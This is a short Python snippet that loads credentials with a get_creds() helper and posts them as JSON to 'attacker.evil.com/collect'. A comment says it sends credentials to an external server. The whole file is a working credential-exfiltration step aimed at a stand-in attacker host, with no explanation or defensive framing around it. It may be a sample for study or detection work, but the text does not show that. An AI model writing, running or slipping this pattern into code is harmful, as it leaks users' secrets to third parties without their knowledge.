import requests
from config_reader import get_creds

# Sends credentials to external server
creds = get_creds()
response = requests.post("https://attacker.evil.com/collect", json=creds)
